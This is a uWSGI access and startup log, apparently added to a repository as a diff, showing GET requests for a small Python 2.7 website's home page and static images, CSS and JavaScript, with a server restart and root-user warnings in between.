+[pid: 552|app: 0|req: 20/26] 114.216.151.15 () {48 vars in 765 bytes} [Sat Mar 23 07:44:00 2019] GET /static/images/g12.jpg => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 553|app: 0|req: 7/27] 114.216.151.15 () {52 vars in 820 bytes} [Sat Mar 23 07:44:01 2019] GET /static/images/iron.ico => generated 38078 bytes in 6 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 0)
+[pid: 553|app: 0|req: 8/28] 114.216.151.15 () {48 vars in 799 bytes} [Sat Mar 23 07:46:35 2019] GET / => generated 19519 bytes in 3 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 3)
+[pid: 553|app: 0|req: 9/29] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 07:46:37 2019] GET /static/images/g3.jpg => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 553|app: 0|req: 10/30] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 07:46:37 2019] GET /static/images/g2.jpg => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 553|app: 0|req: 11/31] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 07:46:38 2019] GET /static/images/g6.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 553|app: 0|req: 12/32] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 07:46:39 2019] GET /static/images/g5.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 553|app: 0|req: 13/33] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 07:46:39 2019] GET /static/images/g7.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 553|app: 0|req: 14/34] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 07:46:39 2019] GET /static/images/g9.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 553|app: 0|req: 15/35] 114.216.151.15 () {48 vars in 797 bytes} [Sat Mar 23 07:46:39 2019] GET /static/images/g10.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 553|app: 0|req: 16/36] 114.216.151.15 () {48 vars in 797 bytes} [Sat Mar 23 07:46:40 2019] GET /static/images/g11.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 552|app: 0|req: 21/37] 114.216.151.15 () {48 vars in 797 bytes} [Sat Mar 23 07:46:40 2019] GET /static/images/g12.jpg => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 552|app: 0|req: 22/38] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 07:46:41 2019] GET /static/images/g4.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 552|app: 0|req: 23/39] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 07:46:48 2019] GET /static/images/g8.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 552|app: 0|req: 24/40] 114.216.151.15 () {48 vars in 773 bytes} [Sat Mar 23 07:54:35 2019] GET / => generated 19519 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 2)
+[pid: 552|app: 0|req: 25/41] 114.216.151.15 () {48 vars in 799 bytes} [Sat Mar 23 08:02:41 2019] GET / => generated 19519 bytes in 3 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 0)
+[pid: 552|app: 0|req: 26/42] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 08:02:41 2019] GET /static/images/g2.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 552|app: 0|req: 27/43] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 08:02:41 2019] GET /static/images/g3.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 552|app: 0|req: 28/44] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 08:02:41 2019] GET /static/images/g4.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 552|app: 0|req: 29/45] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 08:02:42 2019] GET /static/images/g5.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 552|app: 0|req: 30/46] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 08:02:42 2019] GET /static/images/g6.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 552|app: 0|req: 31/47] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 08:02:42 2019] GET /static/images/g7.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 552|app: 0|req: 32/48] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 08:02:42 2019] GET /static/images/g8.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 552|app: 0|req: 33/49] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 08:02:42 2019] GET /static/images/g9.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 552|app: 0|req: 34/50] 114.216.151.15 () {48 vars in 797 bytes} [Sat Mar 23 08:02:42 2019] GET /static/images/g11.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 552|app: 0|req: 35/51] 114.216.151.15 () {48 vars in 797 bytes} [Sat Mar 23 08:02:42 2019] GET /static/images/g12.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 552|app: 0|req: 36/52] 114.216.151.15 () {48 vars in 797 bytes} [Sat Mar 23 08:02:43 2019] GET /static/images/g10.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 552|app: 0|req: 37/53] 61.141.74.189 () {50 vars in 951 bytes} [Sat Mar 23 08:14:57 2019] GET / => generated 19519 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 2)
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+goodbye to uWSGI.
+[uWSGI] getting INI configuration from /var/www/xinminhao/uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Mar 23 08:26:55 2019] ***
+compiled with version: 6.3.0 20170516 on 21 March 2019 13:18:56
+os: Linux-4.9.0-8-amd64 #1 SMP Debian 4.9.110-3+deb9u6 (2018-10-08)
+nodename: xinminhao
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /
+detected binary path: /root/venv/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/xinminhao/
+your processes number limit is 3898
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:8001 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 2.7.13 (default, Sep 26 2018, 18:42:22)  [GCC 6.3.0 20170516]
+Python main interpreter initialized at 0x562843f38780
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 312672 bytes (305 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x562843f38780 pid: 821 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 821)
+spawned uWSGI worker 1 (pid: 840, cores: 4)
+spawned uWSGI worker 2 (pid: 841, cores: 4)
+*** Stats server enabled on 127.0.0.1:9191 fd: 11 ***
+[pid: 840|app: 0|req: 1/1] 114.216.151.15 () {48 vars in 773 bytes} [Sat Mar 23 08:27:09 2019] GET / => generated 19519 bytes in 34 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 0)
+[pid: 840|app: 0|req: 2/2] 114.216.151.15 () {50 vars in 804 bytes} [Sat Mar 23 08:27:34 2019] GET / => generated 19519 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 3)
+[pid: 840|app: 0|req: 3/3] 114.216.151.15 () {48 vars in 762 bytes} [Sat Mar 23 08:27:35 2019] GET /static/css/font-awesome.css => generated 35134 bytes in 13 msecs via sendfile() (HTTP/1.1 200) 8 headers in 303 bytes (0 switches on core 2)
+[pid: 841|app: 0|req: 1/4] 114.216.151.15 () {48 vars in 754 bytes} [Sat Mar 23 08:27:35 2019] GET /static/css/chocolat.css => generated 1951 bytes in 13 msecs via sendfile() (HTTP/1.1 200) 8 headers in 301 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 4/5] 114.216.151.15 () {48 vars in 778 bytes} [Sat Mar 23 08:27:35 2019] GET /static/css/easy-responsive-tabs.css => generated 5672 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 300 bytes (0 switches on core 1)
+[pid: 841|app: 0|req: 2/6] 114.216.151.15 () {48 vars in 756 bytes} [Sat Mar 23 08:27:36 2019] GET /static/css/bootstrap.css => generated 141622 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 305 bytes (0 switches on core 3)
+[pid: 841|app: 0|req: 3/7] 114.216.151.15 () {48 vars in 748 bytes} [Sat Mar 23 08:27:38 2019] GET /static/css/style.css => generated 56231 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 302 bytes (0 switches on core 2)
+[pid: 841|app: 0|req: 4/8] 114.216.151.15 () {48 vars in 750 bytes} [Sat Mar 23 08:27:39 2019] GET /static/css/family.css => generated 3082 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 8 headers in 300 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 5/9] 114.216.151.15 () {48 vars in 779 bytes} [Sat Mar 23 08:27:39 2019] GET /static/images/banner1.jpg => generated 246709 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 6/10] 114.216.151.15 () {48 vars in 769 bytes} [Sat Mar 23 08:27:40 2019] GET /static/images/c3.png => generated 14458 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 288 bytes (0 switches on core 3)
+[pid: 840|app: 0|req: 7/11] 114.216.151.15 () {48 vars in 750 bytes} [Sat Mar 23 08:27:40 2019] GET /static/css/italic.css => generated 12217 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 302 bytes (0 switches on core 2)
+[pid: 840|app: 0|req: 8/12] 114.216.151.15 () {48 vars in 751 bytes} [Sat Mar 23 08:27:40 2019] GET /static/js/jquery-2.1.4.min.js => generated 84345 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 9/13] 114.216.151.15 () {48 vars in 747 bytes} [Sat Mar 23 08:27:42 2019] GET /static/js/jquery.picEyes.js => generated 2938 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 315 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 10/14] 114.216.151.15 () {48 vars in 735 bytes} [Sat Mar 23 08:27:42 2019] GET /static/js/move-top.js => generated 1330 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 3)
+[pid: 840|app: 0|req: 11/15] 114.216.151.15 () {48 vars in 731 bytes} [Sat Mar 23 08:27:42 2019] GET /static/js/easing.js => generated 4758 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 2)
+[pid: 840|app: 0|req: 12/16] 114.216.151.15 () {48 vars in 757 bytes} [Sat Mar 23 08:27:43 2019] GET /static/js/modernizr-2.6.2.min.js => generated 15414 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 1)
+[pid: 841|app: 0|req: 5/17] 114.216.151.15 () {48 vars in 749 bytes} [Sat Mar 23 08:27:43 2019] GET /static/js/jquery.chocolat.js => generated 10203 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 0)
+[pid: 841|app: 0|req: 6/18] 114.216.151.15 () {48 vars in 759 bytes} [Sat Mar 23 08:27:44 2019] GET /static/js/responsiveslides.min.js => generated 3397 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 3)
+[pid: 841|app: 0|req: 7/19] 114.216.151.15 () {48 vars in 727 bytes} [Sat Mar 23 08:27:44 2019] GET /static/js/main.js => generated 3260 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 315 bytes (0 switches on core 2)
+[pid: 841|app: 0|req: 8/20] 114.216.151.15 () {48 vars in 759 bytes} [Sat Mar 23 08:27:45 2019] GET /static/js/easy-responsive-tabs.js => generated 6489 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 13/21] 114.216.151.15 () {48 vars in 757 bytes} [Sat Mar 23 08:27:45 2019] GET /static/js/bootstrap-3.1.1.min.js => generated 29110 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 14/22] 114.216.151.15 () {48 vars in 769 bytes} [Sat Mar 23 08:27:47 2019] GET /static/images/c1.png => generated 21632 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 288 bytes (0 switches on core 3)
+[pid: 840|app: 0|req: 15/23] 114.216.151.15 () {48 vars in 769 bytes} [Sat Mar 23 08:27:49 2019] GET /static/images/t1.jpg => generated 57504 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 2)
+[pid: 840|app: 0|req: 16/24] 114.216.151.15 () {48 vars in 769 bytes} [Sat Mar 23 08:27:49 2019] GET /static/images/c2.png => generated 21112 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 288 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 17/25] 114.216.151.15 () {48 vars in 769 bytes} [Sat Mar 23 08:27:50 2019] GET /static/images/t2.jpg => generated 66622 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 18/26] 114.216.151.15 () {48 vars in 769 bytes} [Sat Mar 23 08:27:52 2019] GET /static/images/t3.jpg => generated 29498 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 3)
+[pid: 840|app: 0|req: 19/27] 114.216.151.15 () {48 vars in 769 bytes} [Sat Mar 23 08:27:53 2019] GET /static/images/t4.jpg => generated 31577 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 2)
+[pid: 840|app: 0|req: 20/28] 114.216.151.15 () {48 vars in 769 bytes} [Sat Mar 23 08:27:54 2019] GET /static/images/g1.jpg => generated 150373 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 21/29] 114.216.151.15 () {48 vars in 769 bytes} [Sat Mar 23 08:27:54 2019] GET /static/images/g2.jpg => generated 116260 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 22/30] 114.216.151.15 () {48 vars in 769 bytes} [Sat Mar 23 08:27:56 2019] GET /static/images/g3.jpg => generated 93835 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 3)
+[pid: 840|app: 0|req: 23/31] 114.216.151.15 () {48 vars in 769 bytes} [Sat Mar 23 08:28:00 2019] GET /static/images/g4.jpg => generated 61003 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 2)
+[pid: 840|app: 0|req: 24/32] 114.216.151.15 () {48 vars in 769 bytes} [Sat Mar 23 08:28:02 2019] GET /static/images/g5.jpg => generated 51280 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 25/33] 114.216.151.15 () {48 vars in 769 bytes} [Sat Mar 23 08:28:04 2019] GET /static/images/g6.jpg => generated 58254 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 26/34] 114.216.151.15 () {48 vars in 769 bytes} [Sat Mar 23 08:28:05 2019] GET /static/images/g7.jpg => generated 114672 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 3)
+[pid: 840|app: 0|req: 27/35] 114.216.151.15 () {48 vars in 769 bytes} [Sat Mar 23 08:28:06 2019] GET /static/images/g8.jpg => generated 137648 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 2)
+[pid: 840|app: 0|req: 28/36] 114.216.151.15 () {48 vars in 773 bytes} [Sat Mar 23 08:28:18 2019] GET / => generated 19519 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 1)
+[pid: 840|app: 0|req: 29/37] 114.216.151.15 () {48 vars in 778 bytes} [Sat Mar 23 08:28:18 2019] GET /static/css/easy-responsive-tabs.css => generated 5672 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 300 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 30/38] 114.216.151.15 () {52 vars in 849 bytes} [Sat Mar 23 08:28:19 2019] GET /static/images/g8.jpg => generated 1 bytes in 2 msecs (HTTP/1.1 206) 9 headers in 341 bytes (1 switches on core 3)
+[pid: 840|app: 0|req: 31/39] 114.216.151.15 () {52 vars in 849 bytes} [Sat Mar 23 08:28:20 2019] GET /static/images/g7.jpg => generated 1 bytes in 1 msecs (HTTP/1.1 206) 9 headers in 341 bytes (1 switches on core 2)
+[pid: 841|app: 0|req: 9/40] 114.216.151.15 () {48 vars in 791 bytes} [Sat Mar 23 08:28:20 2019] GET /static/images/arr.png => generated 861 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 284 bytes (0 switches on core 0)
+[pid: 841|app: 0|req: 12/41] 114.216.151.15 () {48 vars in 769 bytes} [Sat Mar 23 08:28:21 2019] GET /static/images/g9.jpg => generated 135997 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 1)
+[pid: 841|app: 0|req: 12/42] 114.216.151.15 () {48 vars in 771 bytes} [Sat Mar 23 08:28:21 2019] GET /static/images/g10.jpg => generated 52572 bytes in 6 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 2)
+[pid: 840|app: 0|req: 33/43] 114.216.151.15 () {48 vars in 771 bytes} [Sat Mar 23 08:28:21 2019] GET /static/images/g12.jpg => generated 78872 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 33/44] 114.216.151.15 () {48 vars in 771 bytes} [Sat Mar 23 08:28:21 2019] GET /static/images/g11.jpg => generated 92667 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 1)
+[pid: 841|app: 0|req: 12/45] 114.216.151.15 () {48 vars in 797 bytes} [Sat Mar 23 08:28:21 2019] GET /static/images/arrows.png => generated 4243 bytes in 7 msecs via sendfile() (HTTP/1.1 200) 8 headers in 287 bytes (0 switches on core 3)
+[pid: 841|app: 0|req: 13/46] 114.216.151.15 () {52 vars in 850 bytes} [Sat Mar 23 08:28:21 2019] GET /static/images/g7.jpg => generated 49474 bytes in 4 msecs (HTTP/1.1 206) 9 headers in 346 bytes (140 switches on core 1)
+[pid: 841|app: 0|req: 14/47] 114.216.151.15 () {48 vars in 799 bytes} [Sat Mar 23 08:28:23 2019] GET /static/images/contact.jpg => generated 248074 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 2)
+[pid: 840|app: 0|req: 34/48] 114.216.151.15 () {52 vars in 850 bytes} [Sat Mar 23 08:28:24 2019] GET /static/images/g8.jpg => generated 105218 bytes in 7 msecs (HTTP/1.1 206) 9 headers in 347 bytes (275 switches on core 0)
+[pid: 840|app: 0|req: 35/49] 114.216.151.15 () {50 vars in 846 bytes} [Sat Mar 23 08:28:25 2019] GET /static/fonts/glyphicons-halflings-regular.woff2 => generated 18028 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 2)
+[pid: 840|app: 0|req: 36/50] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 08:28:31 2019] GET /static/images/close.png => generated 499 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 285 bytes (0 switches on core 3)
+[pid: 840|app: 0|req: 37/51] 114.216.151.15 () {50 vars in 846 bytes} [Sat Mar 23 08:28:42 2019] GET /static/fonts/fontawesome-webfont.woff2?v=4.6.3 => generated 71896 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 38/52] 114.216.151.15 () {48 vars in 799 bytes} [Sat Mar 23 08:30:49 2019] GET / => generated 19519 bytes in 4 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 0)
+[pid: 840|app: 0|req: 39/53] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 08:30:49 2019] GET /static/images/g2.jpg => generated 116260 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 2)
+[pid: 841|app: 0|req: 15/54] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 08:30:49 2019] GET /static/images/g3.jpg => generated 93835 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 0)
+[pid: 841|app: 0|req: 16/55] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 08:30:50 2019] GET /static/images/g4.jpg => generated 61003 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 3)
+[pid: 841|app: 0|req: 17/56] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 08:30:50 2019] GET /static/images/g5.jpg => generated 51280 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 1)
+[pid: 841|app: 0|req: 18/57] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 08:30:50 2019] GET /static/images/g6.jpg => generated 58254 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 2)
+[pid: 840|app: 0|req: 40/58] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 08:30:50 2019] GET /static/images/g7.jpg => generated 114672 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 3)
+[pid: 840|app: 0|req: 41/59] 114.216.151.15 () {48 vars in 797 bytes} [Sat Mar 23 08:30:53 2019] GET /static/images/g11.jpg => generated 92667 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 1)
+[pid: 841|app: 0|req: 19/60] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 08:30:53 2019] GET /static/images/g8.jpg => generated 137648 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 2)
+[pid: 841|app: 0|req: 20/61] 114.216.151.15 () {48 vars in 797 bytes} [Sat Mar 23 08:30:54 2019] GET /static/images/g10.jpg => generated 52572 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 3)
+[pid: 841|app: 0|req: 21/62] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 08:30:54 2019] GET /static/images/g9.jpg => generated 135997 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 42/63] 114.216.151.15 () {48 vars in 797 bytes} [Sat Mar 23 08:30:57 2019] GET /static/images/g12.jpg => generated 78872 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 43/64] 114.216.151.15 () {50 vars in 956 bytes} [Sat Mar 23 08:31:43 2019] GET / => generated 19519 bytes in 7 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 2)
+[pid: 840|app: 0|req: 44/65] 114.216.151.15 () {48 vars in 796 bytes} [Sat Mar 23 08:31:45 2019] GET /static/css/font-awesome.css => generated 35134 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 303 bytes (0 switches on core 3)
+[pid: 840|app: 0|req: 45/66] 114.216.151.15 () {48 vars in 782 bytes} [Sat Mar 23 08:31:46 2019] GET /static/css/style.css => generated 56231 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 302 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 46/67] 114.216.151.15 () {48 vars in 812 bytes} [Sat Mar 23 08:31:47 2019] GET /static/css/easy-responsive-tabs.css => generated 5672 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 300 bytes (0 switches on core 1)
+[pid: 841|app: 0|req: 22/68] 114.216.151.15 () {48 vars in 784 bytes} [Sat Mar 23 08:31:47 2019] GET /static/css/italic.css => generated 12217 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 302 bytes (0 switches on core 0)
+[pid: 841|app: 0|req: 23/69] 114.216.151.15 () {48 vars in 784 bytes} [Sat Mar 23 08:31:47 2019] GET /static/css/family.css => generated 3082 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 300 bytes (0 switches on core 2)
+[pid: 841|app: 0|req: 24/70] 114.216.151.15 () {48 vars in 791 bytes} [Sat Mar 23 08:31:47 2019] GET /static/js/modernizr-2.6.2.min.js => generated 15414 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 3)
+[pid: 841|app: 0|req: 25/71] 114.216.151.15 () {48 vars in 813 bytes} [Sat Mar 23 08:31:48 2019] GET /static/images/banner1.jpg => generated 246709 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 47/72] 114.216.151.15 () {48 vars in 803 bytes} [Sat Mar 23 08:31:49 2019] GET /static/images/c3.png => generated 14458 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 288 bytes (0 switches on core 1)
+[pid: 841|app: 0|req: 26/73] 114.216.151.15 () {48 vars in 790 bytes} [Sat Mar 23 08:31:49 2019] GET /static/css/bootstrap.css => generated 141622 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 305 bytes (0 switches on core 1)
+[pid: 841|app: 0|req: 27/74] 114.216.151.15 () {48 vars in 785 bytes} [Sat Mar 23 08:31:50 2019] GET /static/js/jquery-2.1.4.min.js => generated 84345 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 2)
+[pid: 841|app: 0|req: 28/75] 114.216.151.15 () {48 vars in 788 bytes} [Sat Mar 23 08:31:52 2019] GET /static/css/chocolat.css => generated 1951 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 301 bytes (0 switches on core 3)
+[pid: 840|app: 0|req: 48/76] 114.216.151.15 () {48 vars in 781 bytes} [Sat Mar 23 08:31:53 2019] GET /static/js/jquery.picEyes.js => generated 2938 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 315 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 49/77] 114.216.151.15 () {48 vars in 769 bytes} [Sat Mar 23 08:31:54 2019] GET /static/js/move-top.js => generated 1330 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 50/78] 114.216.151.15 () {48 vars in 765 bytes} [Sat Mar 23 08:31:54 2019] GET /static/js/easing.js => generated 4758 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 2)
